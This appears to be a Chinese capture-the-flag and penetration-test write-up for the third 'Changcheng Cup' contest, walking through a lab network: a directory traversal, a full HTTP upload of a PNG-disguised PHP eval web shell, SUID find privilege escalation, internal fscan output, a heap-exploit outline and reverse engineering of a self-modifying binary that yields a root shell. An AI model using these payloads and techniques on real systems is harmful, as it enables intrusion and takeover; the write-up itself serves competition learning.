---
title: 第三届\"长城杯\"网数智安全大赛CTF&amp;渗透WP全流程
url: https://mp.weixin.qq.com/s/bI06vhU95LgJvmOXO1ZDAw
source: Doonsec's feed
date: 2026-05-03
fetch_date: 2026-05-04T05:28:39.342124
---

# 第三届\"长城杯\"网数智安全大赛CTF&amp;渗透WP全流程

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/L5p13fmOxK3LqI1bpt5IHQmtPNpgOvUMRdXdW2xfibF0ibSux6u1vjQxpEtCoxYRLgolIsS1D34cR3zZibt7QpCV7T1QWgmIiapM1JavFEqoApM/0?wx_fmt=jpeg)

# 第三届"长城杯"网数智安全大赛CTF&渗透WP全流程

原创

李七庄驾校
李七庄驾校

Zer0day安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 第三届"长城杯"网数智安全大赛CTF&渗透WP全流程

本次大赛涉及到的全部附件都已经打包好了
后台回复"长城杯2026"即可获取

## 渗透

扫目录/storage/下存在目录遍历,能下载data.sqlite文件,拿到后台账密

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK1aepe5NxE6NibZxlL6ria0oH3Es41IwYW1B5YIEnxX8yWDjba1vSKPOj2KK26sVt6iarsTeDD2eO9Qu35YscIxOXhF2gJTR5nexY/640?wx_fmt=png&from=appmsg)

登录后有文件上传点

```
POST /admin.php HTTP/1.1
Host: 10.11.133.99
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjtjXAELmDO7rHwwg
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=a208ddcmkfhnhgq3t3nhcp9pmr
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.11.133.99/admin.php
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Origin: http://10.11.133.99
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Content-Length: 721
------WebKitFormBoundaryjtjXAELmDO7rHwwg
Content-Disposition: form-data; name="action"
upload_file
------WebKitFormBoundaryjtjXAELmDO7rHwwg
Content-Disposition: form-data; name="attachment"; filename="aaa.php"
Content-Type: image/png
{{unquote("\x89PNG\x0d\x0a\x1a\x0a\x00\x00\x00\x0dIHDR\x00\x00\x00\x05\x00\x00\x00\x04\x08\x06\x00\x00\x00F3\xf5@\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\x09pHYs\x00\x00\x0e\xc3\x00\x00\x0e\xc3\x01\xc7o\xa8d\x00\x00\x00!IDAT\x18Wc\x9c\xb2\xfd\xcc\x7f\x06\x28\xf8\x0fe11\xfcg\x02\xf2P1\x90\xc4\x04X\x04\x19\x18\x00\x93\x0a\x0a!C\xd6\xf8X\x00\x00\x00\x00IEND\xaeB`\x82")}}<?php eval($_POST[1]);?>
------WebKitFormBoundaryjtjXAELmDO7rHwwg--
```

低权限,发现suid:`-rwsr-xr-x 1 root root /usr/bin/find`

find提权, 拿到flag

`cmsapp@dmz-cms:/tmp$ find . -exec cat /f1ag \; -quit flag1: flag{faafcf92d6744ba293479c80fd600be8}`

发现双网卡, 上传fscan扫内网网段

```
cmsapp@dmz-cms:/tmp$ ./xiaomi_linux -h 192.168.7.8/24

       _                         _
      (_)                       (_)
 __  ___  __ _  ___    _ __ ___  _
 \ \/ | |/ _' |/ _ \  | '_ ' _ \| |
  >  <| | (_| | (_) | | | | | | | |
 /_/\_|_|\__,_|\___/  |_| |_| |_|_|

                     version: 100 Pro Max
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 192.168.7.2     is alive
(icmp) Target 192.168.7.8     is alive
(icmp) Target 192.168.7.13    is alive
(icmp) Target 192.168.7.51    is alive
(icmp) Target 192.168.7.83    is alive
(icmp) Target 192.168.7.128   is alive
[*] Icmp alive hosts len is: 6
192.168.7.51:80 open
192.168.7.128:22 open
192.168.7.8:80 open
192.168.7.83:22 open
192.168.7.51:22 open
192.168.7.13:22 open
192.168.7.83:21 open
192.168.7.8:22 open
192.168.7.2:53 open
192.168.7.83:8092 open
192.168.7.13:11434 open
[*] alive ports len is: 11
start vulscan
[*] WebTitle http://192.168.7.51       code:200 len:595    title:Directory listing for /
[*] WebTitle http://192.168.7.13:11434 code:200 len:17     title:None
[+] InfoScan http://192.168.7.51       [目录遍历]
[*] WebTitle http://192.168.7.8        code:200 len:6510   title:首页 | 华讯内容管理系统
[*] WebTitle http://192.168.7.83:8092  code:404 len:117    title:None
[+] ftp 192.168.7.83:21:anonymous
   [->]pub
```

* • http://192.168.7.51能拿到相关固件和依赖, 是一个题目说的protokms系统

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK2wxicgGbcwkmLZSaUwiacOKWBzZfZ8CvvnDQW6bpcDibs9h7iarj1Hlj8lITOCaW0Ro8Y7LRxCs6eFR0oIT4KU9ebx93C6fcypOMI/640?wx_fmt=png&from=appmsg)

保护:

`checksec`:

* • Full RELRO
* • Canary
* • NX
* • PIE
* • SHSTK
* • IBT

同时程序启动时还装了 seccomp，常规 `open/openat/execve/mmap/mprotect/socket/fork` 都被拦。

所以当时就没有细看了, 赛后分析发现程序会直接 **READ id=0**.程序启动时会先尝试读取`/etc/passwd.keys`到0号槽，然后没有鉴权，READ 会把6 号槽里
的secret\_key原样回出来，这里可能会泄露关键信息。

还可以考虑openat2，由于是赛后打的，就默认kernel>5.6吧，但是赛中有限时间orw还真不好出()，可能就是直接读`/etc/passwd.keys`然后继续渗透，这里就简单贴一下orw思路了(实现任意文件读)

1. 1. 用 UAF 做稳定 fastbin 布局
2. 2. 把分配打进 `.bss`，拿全局槽位任意读写
3. 3. 用 `environ -> auxv -> AT_RANDOM` 拿 `pointer_guard`
4. 4. 伪造 `__exit_funcs`
5. 5. `setcontext + syscall(openat2) + read/write` 完成任意文件读

* • http://192.168.7.13:11434是个ollama服务, 当时环境无法实现ollama未授权RCE, 看模型/api/tags存在一个0.5B的千问模型, 尝试提示词注入些信息未果
* • http://192.168.7.83:8092是个spring服务, 扫目录存在/actuator路由, 里面存在gateway, 能想到打spring gateway rce, 但是工具梭哈失败, 手动尝试CVE-2025-41243最新的绕过rce也失败

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK3Bu4nX8HS71VdUfGP5o2oGfJEIZPIvJNKECRvRSvX7yvw5lQyIapcs2EITr5UtYDxgrcpEtZTgeXMoqdb0dlLCgTvRw7DNqrs/640?wx_fmt=png&from=appmsg)只好先进ftp内看看, 从里面下载了个jar包
![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK3uGbfibvrpicvbXcdicQloffnHdl4ZkkicgoHoN7MvyqkBNuecPH8T3K7UDPHMfuShMJic6hsr01IK7nPavgT6o9YiacW93Q8Y84eUA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK0llNruGCiaUicRGQ4hXTFmuN8YaOmoRfJV5boLCz9YsoLBzBMcQdSId0BVZWv7jrScFaiclIJgmPA1mdLiaicWLznpQAC6Ijq1Eicic0/640?wx_fmt=png&from=appmsg)

发现存在/analyze路由 其中在`AnalyzerController.class`里会`new AnalyzerBean`，随后调用`readObject()；`而`AnalyzerBean.class`的 `readObject()`会做`Base64 -> GZIP -> ObjectInputStream.readObject()`。这就是标准 Java 反序列化 RCE 点。

![](https://mmbiz.qpic.cn/mmbiz_png/L5p13fmOxK1ibjFsrknTv7aOzbg1HodicoEM9WnZhRueRKBmk1TYmHPt1XBz9ABiaicN4grzPktQOKlpNYIpcVevcLdNaAattB7yfzkicvK0wyZQ/640?wx_fmt=png&from=appmsg)

但/analyze 先校验 **X-Token == tokenBean.generateToken()**，而 TokenBean.class 的 generateToken() 每次都会重新走`SecureRandom.getInstanceStrong()`和`System.nanoTime()`生成新值；控制器比的是“本次新生成”的 token，不是固定的`serialVersionUID`。所以直接伪造`X-Token`基本不可行

而赛中若是打gateway路由refresh失效, 疑似是被禁了, 那么这个站应该是少东西, 目前没法继续利用

* • 192.168.7.128:22可以连上 ssh ctf@192.168.7.128 "ctf" 目录下存在名为judo的二进制文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/L5p13fmOxK1nQrreMG3cYiaMwQNrvJh2SDGOwbH951Vq2afNXKmR4eyIrIibJ32dicvf6rmYV8awkEPkaWrn70K8uHrhPbq90KCox7uafLufts/640?wx_fmt=png&from=appmsg)

当时以为是打pwn， 后面发现实际上没有常规的栈溢出、堆利用或者 GOT 劫持，核心是一个被花指令和自修改代码包起来的隐藏校验器。
拿到正确的 16 字节 ticket 后，程序会直接执行：

```
setuid(0);
setgid(0);
execle("/bin/bash", "bash", NULL, &envp);
```

所以本质上是一个“找 ticket -> 拿 shell”的题。

但当时赛场没时间调出来了, 后续都在看ctf赛道, 这里贴一下赛后的分析

```
## 程序主逻辑

从 `main` 开始看，程序流程很短：

1. `clearenv()` 清空环境变量
2. 输出欢迎信息
3. `fgets(buf, 64, stdin)`
4. 去掉换行
5. 如果长度不是 `16`，直接 `_exit(1)`

IDA 导出的伪代码会误导你，以为这里只做了一个长度判断就结束了，但实际汇编里后面还有一段关键逻辑：

```asm
1449: e8 00 00 00 00    call 144e
144e: 48 83 04 24 2a    add qword ptr [rsp], 0x2a
1453: c3                ret
1454: lea rax, [rbp-0x50]
1458: lea rdx, [rip+0x5c38]   ; "s3cRet_t1CkET_!!"
1465: call strcmp
```

这里的 `call 144e` 会先把返回地址 `144e` 压栈，然后 `add [rsp], 0x2a` 把返回地址改成 `1454 + 0x2a = 1478`，最后 `ret`。
也就是说：

- 只要输入长度是 16，就不会真的执行 `strcmp`
- 字符串 `s3cRet_t1CkET_!!` 只是烟雾弹

## 真正的校验入口

被跳转到的位置是：

```asm
1478: lea rax, [rip+0x8b81]   ; 0xa000
1499: call mprotect
14c1: movzx eax, byte ptr [rax+rdx]
14cf: xor eax, 0x37
14de: mov byte ptr [rax+rdx], cl
...
151d: call r8
1523: cmp dword ptr [rbp-0x6c], 1
1529: call sub_12C9
```

逻辑是：

1. 把 `0xa000` 开始的 `0x4000` 字节区域改成可执行
2. 对这段区域逐字节 `xor 0x37`
3. 把它当函数调用
4. 如果返回值等于 `1`，进入 `sub_12C9()`，拿 shell

所以这题的关键就是把 `0xa000` 里的隐藏函数逆出来。

## 隐藏函数的结构

这段隐藏函数并不是普通函数，而是很多层“自修改跳板”：

- 一小段代码先给后面 0x25/0x26/0x29 个字节加上某个常量
- 跳到刚刚修好的下一段
- 下一段继续修补后续代码
- 最终把整个真实校验逻辑逐步展开

直接静态看会很乱，所以更好的办法是：

1. 先把 `.data` 区域整体 `xor 0x37`
2. 用模拟执行把所有自修改都跑完
3. 提取真正执行过的指令流

还原后可以发现，这个隐藏函数本质上做了两层表运算。

## 第一层：16 字节输入 -> 4 个 32 位中间值

`arg1 = 0x2020`，这里放了 `16` 张表，每张表大小是 `0x400`，也就是：

- 每张表 256 项
- 每项 4 字节

输入 16 字节分成 4 组，每组 4 字节，各自做异或：

```text
w0 = T0[in0]  ^ T1[in1]  ^ T2[in2]  ^ T3[in3]
w1 = T4[in4]  ^ T5[in5]  ^ T6[in6]  ^ T7[in7]
w2 = T8[in8]  ^ T9[in9]  ^ T10[in10] ^ T11[in11]
w3 = T12[in12] ^ T13[in13] ^ T14[in14] ^ T15[in15]
```

然后把四个 `uint32` 按小端拆成 16 个字节。

## 第二层：16 个中间字节 -> 与目标常量比较

`arg2 = 0x6020`，这里放了 `16` 张字节表，每张表大小 `0x100`。
每个中间字节再经过一张单字节查表，然后和 `arg3 = 0x7020` 开始的 16 字节目标值比较。

...